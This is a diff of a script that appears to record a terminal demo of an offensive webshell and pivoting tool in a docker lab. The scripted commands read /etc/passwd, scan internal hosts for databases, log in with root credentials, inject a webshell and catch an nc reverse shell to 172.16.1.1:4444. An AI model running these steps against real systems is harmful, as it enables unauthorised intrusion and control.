@@ -23,25 +23,31 @@ import time
 WIDTH, HEIGHT = 104, 32
 
 # (command, seconds to linger after Enter) — the highlight reel.
-# NB: the `pivot scan` range matches the docker compose network (172.16.1.0/29);
-# it discovers the internal MySQL (.2:3306) and PostgreSQL (.3:5432) services.
+# NB: addresses match the docker compose network (172.16.1.0/24): the internal
+# MySQL (.2:3306) and PostgreSQL (.3:5432) services, and the host gateway (.1)
+# that the target reverse-shells back to.
 CMDS = [
-    ("recon", 1.8),                            # bare group -> namespaced action list
     ("recon info", 2.0),                       # target summary
-    ("recon privesc", 2.6),                    # aggregate privesc enumeration
+    ("recon privesc", 2.4),                    # aggregate privesc enumeration
     ("cd /var/www/html", 1.6),                 # prompt cwd updates (state-aware)
-    ("file ls", 2.0),                          # cwd-aware directory table
-    ("file read /etc/passwd", 2.2),            # read a remote file
-    ("id", 1.8),                               # bare input -> REMOTE (www-data)
+    ("file ls", 1.8),                          # cwd-aware directory table
+    ("file read /etc/passwd", 2.0),            # read a remote file
+    ("file put /tmp/notes.txt /var/www/html/notes.txt", 2.0),  # upload
+    ("file get /var/www/html/notes.txt", 2.0), # download it back (round trip)
+    ("id", 1.6),                               # bare input -> REMOTE (www-data)
     ("local", 1.2),                            # safety: prompt flips to LOCAL
     ("whoami", 1.5),                           # runs on the operator box (ubuntu)
     ("remote", 1.2),                           # back to REMOTE
-    ("pivot scan --hosts 172.16.1.0/29 --ports 3306,5432", 4.6),  # pivot: find internal DBs
-    ("pivot db --engine mysql --host db --user root --password root", 2.4),  # DB manager
+    ("pivot scan --hosts 172.16.1.0/29 --ports 3306,5432", 4.4),  # pivot: find internal DBs
+    ("pivot db --engine mysql --host db --user root --password root", 2.2),  # DB manager
     ("databases", 1.8),                        #   nested DB sub-REPL: list schemas
-    ("version", 1.5),                          #   DB server version
-    ("quit", 1.3),                             #   leave the DB sub-REPL
-    ("inject web --password s3cr3t", 2.6),     # inject a secondary webshell
+    ("quit", 1.2),                             #   leave the DB sub-REPL
+    ("inject web --password s3cr3t", 2.4),     # inject a secondary webshell
+    # --- real reverse shell: REPL spawns a local nc listener, target connects back ---
+    ("pivot shell -i 172.16.1.1 -p 4444 -m bash --listen --tool nc", 3.0),
+    ("id", 1.6),                               #   ...commands run in the caught shell
+    ("uname -a", 1.8),
+    ("exit", 1.6),                             #   close the shell -> back to the REPL
     ("quit", 1.8),                             # snapshots the session
 ]
 
